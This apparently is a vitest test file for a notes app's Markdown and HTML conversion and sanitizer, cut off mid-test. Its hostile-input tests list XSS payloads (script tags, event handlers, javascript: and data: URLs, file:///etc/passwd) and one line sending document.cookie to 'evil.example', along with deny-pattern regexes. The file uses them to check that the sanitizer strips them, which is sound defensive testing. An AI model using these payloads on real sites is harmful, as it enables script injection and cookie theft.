import { describe, expect, it } from "vitest";
import { NOTE_MARK_TYPES, NOTE_NODE_TYPES } from "../../../packages/shared/src/notes.ts";
import {
  docToMarkdown,
  docToSections,
  docToText,
  extractLinks,
  htmlToDoc,
  markdownToDoc,
  safeUrl,
  sanitizeDoc,
} from "../src/modules/notes/content/index.ts";
import { MARK_ORDER, NODE_RULES, type PMNode } from "../src/modules/notes/content/schema.ts";
import { BUILTIN_TEMPLATES } from "../src/modules/notes/templates.ts";

// ── Small builders, so the documents in these tests read like the pages they describe ──

type Mark = "bold" | "italic" | "strike" | "code" | "underline" | "highlight";
const text = (value: string, ...marks: Array<Mark | { href: string }>): PMNode =>
  marks.length === 0
    ? { type: "text", text: value }
    : {
        type: "text",
        text: value,
        marks: marks.map((mark) => (typeof mark === "string" ? { type: mark } : { type: "link", attrs: mark })),
      };
const p = (...content: Array<PMNode | string>): PMNode =>
  content.length === 0
    ? { type: "paragraph" }
    : { type: "paragraph", content: content.map((part) => (typeof part === "string" ? text(part) : part)) };
const h = (level: number, value: string): PMNode => ({ type: "heading", attrs: { level }, content: [text(value)] });
const doc = (...content: PMNode[]): PMNode => ({ type: "doc", content });
const li = (...content: PMNode[]): PMNode => ({ type: "listItem", content });
const task = (checked: boolean, ...content: PMNode[]): PMNode => ({ type: "taskItem", attrs: { checked }, content });
const pageLink = (noteId: string, label: string): PMNode => ({ type: "pageLink", attrs: { noteId, label } });
const image = (src: string, alt: string | null = null, title: string | null = null): PMNode => ({
  type: "image",
  attrs: { src, alt, title },
});
const cell = (type: "tableHeader" | "tableCell", ...content: PMNode[]): PMNode => ({ type, content });
const row = (...content: PMNode[]): PMNode => ({ type: "tableRow", content });

/** Every node of a document, depth first. */
function walk(node: PMNode, visit: (node: PMNode) => void): void {
  visit(node);
  for (const child of node.content ?? []) walk(child, visit);
}

function typesIn(node: PMNode): Set<string> {
  const types = new Set<string>();
  walk(node, (current) => {
    types.add(current.type);
    for (const mark of current.marks ?? []) types.add(`mark:${mark.type}`);
  });
  return types;
}

/** Fails if anything in the document could run script or is outside the content model. */
function expectHarmless(node: PMNode): void {
  walk(node, (current) => {
    expect(NOTE_NODE_TYPES as readonly string[], `node type ${current.type}`).toContain(current.type);
    expect(Object.keys(current).filter((key) => !["type", "attrs", "content", "text", "marks"].includes(key))).toEqual([]);
    const urls = [current.attrs?.src, ...(current.marks ?? []).map((mark) => mark.attrs?.href)].filter((url) => url !== undefined);
    for (const url of urls) {
      expect(String(url)).not.toMatch(/^\s*(javascript|vbscript|data:text|file):/i);
      expect(safeUrl(url, current.type === "image" ? "image" : "link")).toBe(url);
    }
    for (const mark of current.marks ?? []) expect(NOTE_MARK_TYPES as readonly string[]).toContain(mark.type);
    for (const key of Object.keys(current.attrs ?? {})) expect(key).not.toMatch(/^on/i);
  });
}

describe("content model", () => {
  it("has a server rule for every node and mark the editor contract names", () => {
    expect(Object.keys(NODE_RULES).sort()).toEqual([...NOTE_NODE_TYPES].sort());
    expect([...MARK_ORDER].sort()).toEqual([...NOTE_MARK_TYPES].sort());
  });

  it("ships built-in templates that are already valid documents", () => {
    expect(BUILTIN_TEMPLATES.map((template) => template.id)).toEqual([
      "builtin:meeting-notes",
      "builtin:trip-plan",
      "builtin:kit-list",
      "builtin:reference-card",
      "builtin:daily-log",
    ]);
    for (const template of BUILTIN_TEMPLATES) {
      expect(sanitizeDoc(template.content), template.id).toEqual(template.content);
      expect(docToText(template.content).length, template.id).toBeGreaterThan(80);
    }
    expect(typesIn(BUILTIN_TEMPLATES[2]!.content)).toContain("taskList");
    const card = typesIn(BUILTIN_TEMPLATES[3]!.content);
    expect(card).toContain("callout");
    expect(card).toContain("table");
  });
});

describe("Markdown round trips", () => {
  // Canonical Markdown for each construct, and the node or mark it must become. Each one
  // has to survive Markdown → document → Markdown and document → Markdown → document.
  const constructs: Array<[name: string, markdown: string, becomes: string[]]> = [
    ["headings", "# One\n\n## Two\n\n### Three\n", ["heading"]],
    [
      "bold, italic, strike and code",
      "Some **bold**, *italic*, ~~struck~~ and `code` text.\n",
      ["mark:bold", "mark:italic", "mark:strike", "mark:code"],
    ],
    ["underline and highlight", "This is <u>underlined</u> and <mark>highlighted</mark>.\n", ["mark:underline", "mark:highlight"]],
    ["marks inside marks", "**bold *and italic* together** then **_both_** and **<u>bold underline</u>**\n", ["mark:bold", "mark:italic"]],
    ["links", "Read [the *guide*](https://example.com/a?b=c\\&d=e) or write to [us](mailto:hi@example.com).\n", ["mark:link"]],
    ["bullet lists, nested", "- one\n- two\n  - inner\n    - deeper\n- three\n", ["bulletList", "listItem"]],
    ["ordered lists with a start", "3. three\n4. four\n   1. nested\n", ["orderedList"]],
    ["task lists", "- [x] done\n- [ ] to do\n  - [ ] part of it\n", ["taskList", "taskItem"]],
    ["blockquotes", "> quoted\n>\n> second paragraph\n", ["blockquote"]],
    ["fenced code with a language", "```js\nconst a = 1;\n\nif (a) console.log(`*not bold*`);\n```\n", ["codeBlock"]],
    ["fenced code without a language", "```\nplain\n```\n", ["codeBlock"]],
    [
      "tables",
      "| Item | Qty |\n| - | - |\n| **Rope** | 2 |\n| Line one<br>line two | `x` |\n",
      ["table", "tableRow", "tableHeader", "tableCell"],
    ],
    ["images", '![A map](/api/attachments/01hxmap "Route overview")\n', ["image"]],
    ["horizontal rules", "above\n\n***\n\nbelow\n", ["horizontalRule"]],
    ["hard breaks", "line one\\\nline two\n", ["hardBreak"]],
    ["callout: info", "> [!NOTE]\n> Worth knowing.\n", ["callout"]],
    ["callout: warning", "> [!WARNING]\n> Careful **here**.\n>\n> - with\n> - a list\n", ["callout", "bulletList"]],
    ["callout: success", "> [!TIP]\n> It worked.\n", ["callout"]],
    ["callout: danger", "> [!CAUTION]\n> Stop.\n", ["callout"]],
    ["page links", "See [Kit list](/notes/01hxkit) before leaving.\n", ["pageLink"]],
    ["document embeds", "[Field manual](/library/documents/01hxdoc)\n", ["documentEmbed"]],
    [
      "toggles",
      "<details>\n<summary>More <strong>detail</strong></summary>\n\nHidden *text*\n\n- and a list\n\n</details>\n",
      ["details", "detailsSummary", "detailsContent"],
    ],
    ["characters that look like Markdown", "2 \\* 3 = 6, snake_case, \\[not a link] and \\<b>not html\\</b>\n", ["text"]],
  ];

  for (const [name, markdown, becomes] of constructs) {
    it(`keeps ${name}`, () => {
      const { doc: first, warnings } = markdownToDoc(markdown);
      expect(warnings).toEqual([]);
      for (const type of becomes) expect([...typesIn(first as PMNode)], `expected a ${type}`).toContain(type);
      expectHarmless(first as PMNode);

      const written = docToMarkdown(first);
      expect(written).toBe(markdown);
      expect(markdownToDoc(written).doc).toEqual(first);
    });
  }

  it("maps each callout variant to its GitHub alert and back", () => {
    const variants = { info: "NOTE", warning: "WARNING", success: "TIP", danger: "CAUTION" };
    for (const [variant, alert] of Object.entries(variants)) {
      const source = doc({ type: "callout", attrs: { variant }, content: [p("Text")] });
      const markdown = docToMarkdown(source);
      expect(markdown).toBe(`> [!${alert}]\n> Text\n`);
      expect(markdownToDoc(markdown).doc).toEqual(source);
    }
    // GitHub's fifth alert has no variant of its own.
    expect(markdownToDoc("> [!IMPORTANT]\n> Text").doc.content[0]).toMatchObject({ type: "callout", attrs: { variant: "info" } });
    // An ordinary quote that merely mentions the marker later stays a quote.
    expect(markdownToDoc("> see [!NOTE] below").doc.content[0]!.type).toBe("blockquote");
  });

  it("round-trips a whole page with every kind of block", () => {
    const page = doc(
      h(1, "Trip"),
      p(
        "Plain, ",
        text("bold", "bold"),
        ", ",
        text("link", { href: "https://example.com" }),
        " and ",
        pageLink("01hxkit", "Kit list"),
        ".",
      ),
      {
        type: "bulletList",
        content: [li(p("one")), li(p("two"), { type: "orderedList", attrs: { start: 1 }, content: [li(p("nested"))] })],
      },
      { type: "taskList", content: [task(true, p("packed")), task(false, p("charged"))] },
      { type: "blockquote", content: [p("quoted")] },
      { type: "codeBlock", attrs: { language: "sh" }, content: [text("ls -la")] },
      { type: "codeBlock", attrs: { language: null } },
      { type: "horizontalRule" },
      {
        type: "table",
        content: [row(cell("tableHeader", p("A")), cell("tableHeader", p("B"))), row(cell("tableCell", p("1")), cell("tableCell", p()))],
      },
      image("/api/attachments/01hxmap", "Map", null),
      {
        type: "callout",
        attrs: { variant: "danger" },
        content: [p("Do not."), { type: "codeBlock", attrs: { language: null }, content: [text("rm -rf")] }],
      },
      { type: "callout", attrs: { variant: "info" }, content: [{ type: "bulletList", content: [li(p("starts with a list"))] }] },
      { type: "documentEmbed", attrs: { documentId: "01hxdoc", title: "Field manual" } },
      {
        type: "details",
        content: [
          { type: "detailsSummary", content: [text("Open "), text("me", "italic")] },
          {
            type: "detailsContent",
            content: [
              p("inside"),
              {
                type: "details",
                content: [
                  { type: "detailsSummary", content: [text("Nested")] },
                  { type: "detailsContent", content: [p("deep")] },
                ],
              },
            ],
          },
        ],
      },
      p("The end."),
    );
    const clean = sanitizeDoc(page);
    expect(clean).toEqual(page);
    expect(markdownToDoc(docToMarkdown(clean)).doc).toEqual(page);
  });

  it("round-trips every built-in template", () => {
    for (const template of BUILTIN_TEMPLATES) {
      const markdown = docToMarkdown(template.content);
      const back = markdownToDoc(markdown).doc;
      // Compare as text and as Markdown: empty paragraphs and trailing spaces are not
      // something Markdown can carry, everything else is.
      expect(docToMarkdown(back), template.id).toBe(markdown);
      expect(docToText(back), template.id).toBe(docToText(template.content));
    }
  });
});

describe("docToMarkdown", () => {
  it("rewrites page links and attachments through the callbacks", () => {
    const page = doc(
      p("Go to ", pageLink("n1", "Camp"), " or ", pageLink("gone", "Old page"), " or ", text("typed link", { href: "/notes/n1" }), "."),
      image("/api/attachments/a1", "Photo"),
      image("https://example.com/remote.png", "Remote"),
      p(text("the file", { href: "/api/attachments/a1" })),
    );
    const markdown = docToMarkdown(page, {
      resolvePageLink: (noteId) => (noteId === "n1" ? "../Places/Camp.md" : undefined),
      resolveAttachment: (attachmentId) => `_attachments/${attachmentId}.png`,
    });
    expect(markdown).toBe(
      "Go to [Camp](../Places/Camp.md) or [Old page](/notes/gone) or [typed link](../Places/Camp.md).\n\n" +
        "![Photo](_attachments/a1.png)\n\n![Remote](https://example.com/remote.png)\n\n[the file](_attachments/a1.png)\n",
    );
  });

  it("moves spaces out of emphasis so the Markdown is valid", () => {
    expect(docToMarkdown(doc(p(text("bold ", "bold"), "then plain")))).toBe("**bold** then plain\n");
    expect(docToMarkdown(doc(p("a", text(" b ", "italic"), "c")))).toBe("a *b* c\n");
    // Trailing spaces and line breaks at the end of a paragraph are dropped, not escaped.
    expect(docToMarkdown(doc(p("typed a space ", { type: "hardBreak" })))).toBe("typed a space\n");
  });

  it("flattens block content in table cells to one line", () => {
    const table: PMNode = {
      type: "table",
      content: [
        row(cell("tableHeader", p("Head"))),
        row(
          cell(
            "tableCell",
            p("first"),
            p("second"),
            { type: "bulletList", content: [li(p("item | with pipe"))] },
            image("/api/attachments/a1", "pic"),
          ),
        ),
      ],
    };
    expect(docToMarkdown(doc(table))).toBe("| Head |\n| - |\n| first<br>second<br>item \\| with pipe<br>![pic](/api/attachments/a1) |\n");
  });

  it("writes text that looks like Markdown so that it reads back as the same text", () => {
    const tricky = [
      "*not italic*",
      "# not a heading",
      "1. not a list",
      "- not a bullet",
      "> not a quote",
      "[!NOTE]",
      "<b>not html</b>",
      "a | b",
      "`",
      "\\",
      "---",
      "![x](y)",
      "&amp;",
    ];
    for (const value of tricky) {
      const page = doc(p(value));
      expect(markdownToDoc(docToMarkdown(page)).doc, value).toEqual(page);
    }
    // The same inside a quote, where "[!NOTE]" must not turn the quote into a callout.
    const quote = doc({ type: "blockquote", content: [p("[!NOTE] is how alerts are written")] });
    expect(markdownToDoc(docToMarkdown(quote)).doc).toEqual(quote);
  });

  it("handles empty and missing documents", () => {
    expect(docToMarkdown(null)).toBe("");
    expect(docToMarkdown(doc(p()))).toBe("");
  });
});

describe("markdownToDoc", () => {
  it("lets an importer resolve relative links, images and document links", () => {
    const { doc: result, warnings } = markdownToDoc(
      "See [the *other* page](Other%20Page.md), [a file](files/data.csv), ![shot](img/shot.png) and [web](https://example.com).\n\n[Manual](docs/manual.pdf)\n",
      {
        resolveLink: (href) =>
          href === "Other%20Page.md"
            ? { type: "note", noteId: "n2" }
            : href === "img/shot.png"
              ? { type: "attachment", attachmentId: "a1" }
              : href === "files/data.csv"
                ? { type: "attachment", attachmentId: "a2" }
                : href === "docs/manual.pdf"
                  ? { type: "document", documentId: "d1" }
                  : null,
      },
    );
    expect(warnings).toEqual([]);
    expect(result.content).toEqual([
      p("See ", pageLink("n2", "the other page"), ", ", text("a file", { href: "/api/attachments/a2" }), ","),
      image("/api/attachments/a1", "shot", null),
      p("and ", text("web", { href: "https://example.com" }), "."),
      { type: "documentEmbed", attrs: { documentId: "d1", title: "Manual" } },
    ]);
    expect(extractLinks(result)).toEqual({ noteIds: ["n2"], documentIds: ["d1"], attachmentIds: ["a2", "a1"] });
  });

  it("survives a resolver that throws", () => {
    const { doc: result } = markdownToDoc("[a](b.md)", {
      resolveLink: () => {
        throw new Error("importer bug");
      },
    });
    expect(result.content).toEqual([p(text("a", { href: "b.md" }))]);
  });

  it("reads the Markdown people actually write", () => {
    const { doc: result } = markdownToDoc(
      [
        "Setext heading",
        "==============",
        "",
        "#### Level four",
        "",
        "soft",
        "wrapped line with a [reference link][ref] and <https://example.com/auto>.",
        "",
        "* star bullets",
        "+ plus bullets",
        "",
        "1) paren numbering",
        "",
        "~~~python",
        "tilde = True",
        "~~~",
        "",
        "    indented code",
        "",
        "| Left | Right |",
        "|:-----|------:|",
        "| a    | b     | extra |",
        "| only |",
        "",
        "[ref]: https://example.com/ref",
      ].join("\n"),
    );
    const blocks = result.content as PMNode[];
    expect(blocks[0]).toEqual(h(1, "Setext heading"));
    expect(blocks[1]).toEqual(h(3, "Level four"));
    expect(blocks[2]).toEqual(
      p(
        "soft wrapped line with a ",
        text("reference link", { href: "https://example.com/ref" }),
        " and ",
        text("https://example.com/auto", { href: "https://example.com/auto" }),
        ".",
      ),
    );
    expect(blocks.map((block) => block.type)).toEqual([
      "heading",
      "heading",
      "paragraph",
      "bulletList",
      "bulletList",
      "orderedList",
      "codeBlock",
      "codeBlock",
      "table",
    ]);
    expect(blocks[6]).toEqual({ type: "codeBlock", attrs: { language: "python" }, content: [text("tilde = True")] });
    expect(blocks[7]).toEqual({ type: "codeBlock", attrs: { language: null }, content: [text("indented code")] });
    // Rows are padded to the widest one, so the table is a rectangle and no cell is lost.
    const table = blocks[8]!;
    expect(table.content!.map((tableRow) => tableRow.content!.length)).toEqual([3, 3, 3]);
    expect(docToText(table)).toBe("Left | Right\na | b | extra\nonly");
  });

  it("takes front matter off the page and returns it", () => {
    const withFrontMatter = markdownToDoc("---\ntitle: Water\ntags: [a, b]\n---\n\nBody\n");
    expect(withFrontMatter.frontmatter).toBe("title: Water\ntags: [a, b]");
    expect(withFrontMatter.doc.content).toEqual([p("Body")]);
    // A page that simply starts with a rule keeps it.
    const rule = markdownToDoc("---\n\nBody\n\n---\n");
    expect(rule.frontmatter).toBeUndefined();
    expect(rule.doc.content.map((block) => block.type)).toEqual(["horizontalRule", "paragraph", "horizontalRule"]);
    expect(markdownToDoc("---\ntitle: Water\n---\nBody", { frontmatter: false }).frontmatter).toBeUndefined();
  });

  it("maps simple, safe HTML and keeps only the words of the rest", () => {
    const { doc: result, warnings } = markdownToDoc(
      [
        'A <u>u</u>, <ins>ins</ins>, <mark>mark</mark>, <b>b</b>, <i>i</i>, <s>s</s>, <kbd>Ctrl</kbd>, <a href="https://example.com">a</a>, line<br>break<br/>again.',
        "",
        "<aside>",
        "",
        "Side **note**",
        "",
        "</aside>",
        "",
        "<aside>Inline aside</aside>",
        "",
        "<details><summary>One <em>line</em></summary>Body text</details>",
        "",
        "<details open>",
        "<summary>Split</summary>",
        "",
        "Markdown *inside*",
        "",
        "</details>",
        "",
        '<div align="center"><span style="color:red">styled</span> <sup>up</sup></div>',
        "",
        "<!-- a comment -->",
        "",
        "Text <font color=red>coloured</font> here.",
      ].join("\n"),
    );
    const blocks = result.content as PMNode[];
    expect(blocks[0]).toEqual(
      p(
        "A ",
        text("u", "underline"),
        ", ",
        text("ins", "underline"),
        ", ",
        text("mark", "highlight"),
        ", ",
        text("b", "bold"),
        ", ",
        text("i", "italic"),
        ", ",
        text("s", "strike"),
        ", ",
        text("Ctrl", "code"),
        ", ",
        text("a", { href: "https://example.com" }),
        ", line",
        { type: "hardBreak" },
        "break",
        { type: "hardBreak" },
        "again.",
      ),
    );
    // An <aside> is a callout whether it wraps Markdown paragraphs or is written in one piece.
    expect(blocks[1]).toEqual({ type: "callout", attrs: { variant: "info" }, content: [p("Side ", text("note", "bold"))] });
    expect(blocks[2]).toEqual({ type: "callout", attrs: { variant: "info" }, content: [p("Inline aside")] });
    expect(blocks[3]).toEqual({
      type: "details",
      content: [
        { type: "detailsSummary", content: [text("One "), text("line", "italic")] },
        { type: "detailsContent", content: [p("Body text")] },
      ],
    });
    expect(blocks[4]).toEqual({
      type: "details",
      content: [
        { type: "detailsSummary", content: [text("Split")] },
        { type: "detailsContent", content: [p("Markdown ", text("inside", "italic"))] },
      ],
    });
    expect(blocks[5]).toEqual(p("styled up"));
    expect(blocks[6]).toEqual(p("Text coloured here."));
    expect(blocks).toHaveLength(7);
    expect(warnings.join(" ")).toMatch(/not supported and was removed/);
  });

  it("degrades what it does not support instead of failing", () => {
    const { doc: result, warnings } = markdownToDoc(
      "Text with a footnote[^1].\n\n[^1]: The note itself.\n\n# ![logo](https://example.com/l.png) Title\n",
    );
    expect(result.content).toEqual([p("Text with a footnote[^1]."), p("[^1]: The note itself."), h(1, "logo Title")]);
    expect(warnings).toEqual(["Footnotes are not supported; their text was kept as ordinary paragraphs."]);

    // An empty task item is still a task item.
    expect(markdownToDoc("- [x] a\n- [ ]\n").doc.content[0]).toEqual({ type: "taskList", content: [task(true, p("a")), task(false, p())] });

    for (const odd of [
      "",
      "   \n\n",
      "\u0000\u0001",
      "[",
      "![](",
      "<",
      "<<<>>>",
      "|||\n|-|",
      "> > > - 1. >",
      "```",
      "<details>",
      "</details>",
      "<summary>x",
      "[a]: b",
      "***",
      "\\",
    ]) {
      expect(() => markdownToDoc(odd), JSON.stringify(odd)).not.toThrow();
      expect(markdownToDoc(odd).doc.content.length).toBeGreaterThan(0);
    }
    // @ts-expect-error callers in other modules may hand over anything
    expect(markdownToDoc(undefined).doc.content).toEqual([p()]);
  });
});

describe("hostile Markdown and HTML", () => {
  it("never lets script, handlers or dangerous addresses through Markdown", () => {
    const hostile = [
      "<script>alert(1)</script>",
      "",
      "<script>",
      "document.location = 'https://evil.example/' + document.cookie",
      "</script>",
      "",
      'Inline <script>alert(2)</script> and <img src=x onerror=alert(3)> and <img src="javascript:alert(4)">.',
      "",
      "[click](javascript:alert(5)) [click](JaVaScRiPt:alert(6)) [click](java&#x09;script:alert(7)) [vb](vbscript:msgbox(8)) [file](file:///etc/passwd)",
      "",
      "![x](javascript:alert(9)) ![y](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==) ![z](data:image/svg+xml;base64,PHN2Zz4=)",
      "",
      "[data](data:text/html,<script>alert(10)</script>)",
      "",
      '<iframe src="https://evil.example"></iframe>',
      "",
      "<style>body { display: none }</style>",
      "",
      '<a href="javascript:alert(11)" onclick="alert(12)">link</a>',
      "",
      "<svg onload=alert(13)><script>alert(14)</script></svg>",
      "",
      "<details ontoggle=alert(15)><summary onclick=alert(16)>S</summary><img src=x onerror=alert(17)></details>",
      "",
      '<object data="evil.swf"></object><embed src="evil.swf"><form action="https://evil.example"><input name=password></form>',
    ].join("\n");
    const { doc: result } = markdownToDoc(hostile);
    expectHarmless(result as PMNode);

    const serialised = JSON.stringify(result);
    expect(serialised).not.toMatch(
      /javascript:|vbscript:|data:text|data:image\/svg|file:\/\/|onerror|onclick|onload|ontoggle|<script|<iframe|<style|evil\.swf/i,
    );
    // Script and style bodies written as HTML blocks are gone entirely. (Written in the
    // middle of a sentence, the tags go and what was between them is ordinary text.)
    expect(serialised).not.toMatch(/alert\(1\)|document\.cookie|display: none/);
    expect(docToText(result)).toContain("Inline alert(2) and");
    // The words of a dangerous link stay; only the link goes.
    expect(docToText(result)).toContain("click click click vb file");
    expect(extractLinks(result)).toEqual({ noteIds: [], documentIds: [], attachmentIds: [] });
  });

  it("cleans HTML before converting it", () => {
    const {
      doc: result,
      title,
      warnings,
    } = htmlToDoc(`<!doctype html>
      <html><head><title>Field  guide</title><style>p { color: red }</style><script>alert(1)</script></head>
      <body onload="alert(2)">
        <h1 onclick="alert(3)">Guide</h1>
        <p style="position:fixed">Text with <u>underline</u>, <mark>highlight</mark>, <strong>bold</strong>,
           <a href="https://example.com" onmouseover="alert(4)" target="_blank">a link</a> and
           <a href="javascript:alert(5)">a bad link</a>.</p>
        <img src="pic.png" alt="A picture" onerror="alert(6)">
        <img src="javascript:alert(7)" alt="bad picture">
        <iframe src="https://evil.example"></iframe>
        <script>alert(8)</script>
        <aside><p>Remember this.</p></aside>
        <details><summary>More</summary><p>Hidden</p></details>
        <ul><li>one</li><li>two<ol start="4"><li>four</li></ol></li></ul>
        <ul class="contains-task-list"><li class="task-list-item"><input type="checkbox" checked disabled> done</li></ul>
        <table><thead><tr><th>A</th><th>B</th></tr></thead><tbody><tr><td>1</td><td>2</td></tr></tbody></table>
        <pre><code class="language-python">print("hi")</code></pre>
        <blockquote><p>Quoted</p></blockquote>
        <hr>
        <object data="x.swf"></object><form><button>Send</button><textarea>typed</textarea></form>
      </body></html>`);
    expect(title).toBe("Field guide");
    expectHarmless(result as PMNode);
    const serialised = JSON.stringify(result);
    expect(serialised).not.toMatch(
      /alert|javascript:|onerror|onclick|onload|onmouseover|iframe|evil|color: red|position|Send|typed|x\.swf/i,
    );

    const blocks = result.content as PMNode[];
    expect(blocks.map((block) => block.type)).toEqual([
      "heading",
      "paragraph",
      "image",
      "paragraph",
      "callout",
      "details",
      "bulletList",
      "taskList",
      "table",
      "codeBlock",
      "blockquote",
      "horizontalRule",
    ]);
    expect(blocks[1]).toEqual(
      p(
        "Text with ",
        text("underline", "underline"),
        ", ",
        text("highlight", "highlight"),
        ", ",
        text("bold", "bold"),
        ", ",
        text("a link", { href: "https://example.com" }),
        " and a bad link.",
      ),
    );
    expect(blocks[2]).toEqual(image("pic.png", "A picture", null));
    expect(blocks[3]).toEqual(p("bad picture"));
    expect(blocks[4]).toEqual({ type: "callout", attrs: { variant: "info" }, content: [p("Remember this.")] });
    expect(blocks[5]).toEqual({
      type: "details",
      content: [
        { type: "detailsSummary", content: [text("More")] },
        { type: "detailsContent", content: [p("Hidden")] },
      ],
    });
    expect(blocks[6]!.content![1]!.content![1]).toEqual({ type: "orderedList", attrs: { start: 4 }, content: [li(p("four"))] });
    expect(blocks[7]).toEqual({ type: "taskList", content: [task(true, p("done"))] });
    expect(docToText(blocks[8]!)).toBe("A | B\n1 | 2");
    expect(blocks[9]).toEqual({ type: "codeBlock", attrs: { language: "python" }, content: [text('print("hi")')] });
    expect(warnings.length).toBeGreaterThan(0);
  });

  it("falls back to the first heading for the title and copes with fragments and rubbish", () => {
    expect(htmlToDoc("<h1>Only a <em>heading</em></h1><p>Body</p>").title).toBe("Only a heading");
    expect(htmlToDoc("<p>No title</p>").title).toBeUndefined();
    expect(htmlToDoc("just text").doc.content).toEqual([p("just text")]);
    expect(htmlToDoc("<u>loose</u> inline <b>content</b>").doc.content).toEqual([
      p(text("loose", "underline"), " inline ", text("content", "bold")),
    ]);
    for (const odd of ["", "<", "<<<", "</p></div>", "<table><tr><td>", "<p><p><p>", "<!-- -->", "\u0000", `${"<div>".repeat(3000)}deep`]) {
      expect(() => htmlToDoc(odd), odd.slice(0, 20)).not.toThrow();
      expectHarmless(htmlToDoc(odd).doc as PMNode);
    }
  });

  it("flattens absurdly deep Markdown instead of passing it on", () => {
    const { doc: result } = markdownToDoc(`${"> ".repeat(300)}bottom`);
    let depth = 0;
    let node: PMNode | undefined = result as PMNode;
    while (node?.content?.[0]) {
      node = node.content[0];
      depth += 1;
    }
    expect(depth).toBeLessThanOrEqual(42);
    expect(docToText(result)).toBe("bottom");
  });
});

describe("sanitizeDoc", () => {
  it("leaves a valid document exactly as it is, and is stable", () => {
    const page = doc(
      h(2, "Title"),
      p("a", text("b", "bold", "italic"), { type: "hardBreak" }, pageLink("n1", "Other")),
      { type: "orderedList", attrs: { start: 5 }, content: [li(p("x"))] },
      {
        type: "table",
        content: [
          row({ type: "tableHeader", attrs: { colspan: 2, rowspan: 1, colwidth: [120, 80] }, content: [p("wide")] }),
          row({ type: "tableCell", attrs: { colspan: 1, rowspan: 1, colwidth: null }, content: [p("1")] }),
        ],
      },
      image("data:image/png;base64,iVBORw0KGgo=", "inline", null),
    );
    const clean = sanitizeDoc(page);
    expect(clean).toEqual(page);
    expect(sanitizeDoc(clean)).toEqual(clean);
  });

  it("removes unknown nodes and marks but keeps their text", () => {
    const clean = sanitizeDoc(
      doc(
        { type: "mysteryBlock", attrs: { onclick: "alert(1)" }, content: [p("inside a mystery"), { type: "widget", text: "widget text" }] },
        p(
          "a ",
          { type: "mention", attrs: { id: "u1" }, content: [text("@sam")] },
          { type: "emoji", attrs: { name: "tent" } },
          text(" styled", "bold", "blink" as never),
        ),
        { type: "iframe", attrs: { src: "https://evil.example" } },
        { type: "htmlBlock", attrs: { html: "<script>alert(1)</script>" } },
        { type: "text", text: "loose text" },
        pageLink("n1", "loose link"),
        { type: "listItem", content: [p("item without a list")] },
        "not even an object" as never,
        null as never,
      ),
    );
    expect(clean.content).toEqual([
      p("inside a mystery"),
      p("widget text"),
      p("a @sam", text(" styled", "bold")),
      p("loose text", pageLink("n1", "loose link")),
      p("item without a list"),
    ]);
    expectHarmless(clean as PMNode);
  });

  it("whitelists attributes on every node", () => {
    const clean = sanitizeDoc(
      doc(
        { type: "heading", attrs: { level: 6, id: "x", style: "color:red", onclick: "alert(1)" }, content: [text("deep")] },
        { type: "heading", attrs: { level: "2" }, content: [text("string level")] },
        {
          type: "paragraph",
          attrs: { textAlign: "center", class: "x" },
          content: [{ type: "text", text: "t", attrs: { x: 1 }, marks: [{ type: "bold", attrs: { style: "x" } }, { type: "bold" }] }],
        },
        {
          type: "codeBlock",
          attrs: { language: 'js"><script>', onload: "x" },
          content: [text("a", "bold"), { type: "hardBreak" }, text("b")],
        },
        { type: "codeBlock", attrs: { language: "c++" }, content: [text("ok")] },
        { type: "orderedList", attrs: { start: "7", type: "a" }, content: [li(p("x"))] },
        { type: "taskList", content: [{ type: "taskItem", attrs: { checked: "yes" }, content: [p("t")] }] },
        { type: "callout", attrs: { variant: "rainbow", icon: "x" }, content: [p("c")] },
        { type: "image", attrs: { src: "/api/attachments/a1", alt: 5, title: "T", width: 9999, onerror: "alert(1)" } },
        { type: "documentEmbed", attrs: { documentId: "d1", title: "Doc", url: "javascript:alert(1)" } },
        { type: "documentEmbed", attrs: { documentId: "../../etc", title: "Bad id" } },
        p(pageLink("n 1", "bad id"), { type: "pageLink", attrs: { noteId: "n1", label: "ok", href: "javascript:x" } }),
        {
          type: "table",
          content: [row({ type: "tableCell", attrs: { colspan: -1, rowspan: 2.5, colwidth: ["x"], style: "x" }, content: [p("c")] })],
        },
      ),
    );
    expect(clean.content).toEqual([
      h(3, "deep"),
      h(1, "string level"),
      p(text("t", "bold")),
      { type: "codeBlock", attrs: { language: null }, content: [text("a\nb")] },
      { type: "codeBlock", attrs: { language: "c++" }, content: [text("ok")] },
      { type: "orderedList", content: [li(p("x"))] },
      { type: "taskList", content: [task(false, p("t"))] },
      { type: "callout", attrs: { variant: "info" }, content: [p("c")] },
      image("/api/attachments/a1", null, "T"),
      { type: "documentEmbed", attrs: { documentId: "d1", title: "Doc" } },
      p("Bad id"),
      p("bad id", pageLink("n1", "ok")),
      { type: "table", content: [row(cell("tableCell", p("c")))] },
    ]);
  });

  it("restricts link and image addresses", () => {
    const allowedLinks = [
      "https://example.com/a?b#c",
      "http://localhost:8080/x",
      "mailto:someone@example.com",
      "/notes/01abc",
      "/library/documents/01abc",
      "/api/attachments/01abc",
      "relative/page.md",
      "../up.md",
      "#heading",
      "?q=1",
    ];
    const refusedLinks = [
      "javascript:alert(1)",
      "JAVASCRIPT:alert(1)",
      "  javascript:alert(1)",
      "java\tscript:alert(1)",
      "java\nscript:alert(1)",
      "\u0001javascript:alert(1)",
      "vbscript:msgbox(1)",
      "data:text/html,<script>alert(1)</script>",
      "data:text/html;base64,PHNjcmlwdD4=",
      "data:image/png;base64,iVBORw0KGgo=",
      "file:///etc/passwd",
      "blob:https://example.com/x",
      "ftp://example.com/x",
      "tel:+123",
      "",
      "   ",
      42,
      null,
      { href: "x" },
    ];
    for (const href of allowedLinks) expect(safeUrl(href, "link"), href).toBe(href);
    for (const href of refusedLinks) expect(safeUrl(href, "link"), String(href)).toBeNull();

    for (const src of [
      "https://example.com/a.png",
      "/api/attachments/01abc",
      "images/a.png",
      "data:image/png;base64,iVBORw0KGgo=",
      "data:image/jpeg;base64,/9j/4AAQ",
      "data:image/gif;base64,R0lGODlh",
      "data:image/webp;base64,UklGRg==",
    ]) {
      expect(safeUrl(src, "image"), src).toBe(src);
    }
    for (const src of [
      "javascript:alert(1)",
      "data:text/html;base64,PHNjcmlwdD4=",
      "data:image/svg+xml;base64,PHN2Zz4=",
      "data:image/png,notbase64",
      "data:image/png;base64,<script>",
      "mailto:x@example.com",
      "file:///x.png",
    ]) {
      expect(safeUrl(src, "image"), src).toBeNull();
    }

    const clean = sanitizeDoc(
      doc(
        p(
          text("bad", { href: "javascript:alert(1)" }),
          " ",
          text("data", { href: "data:text/html,<script>alert(1)</script>" }),
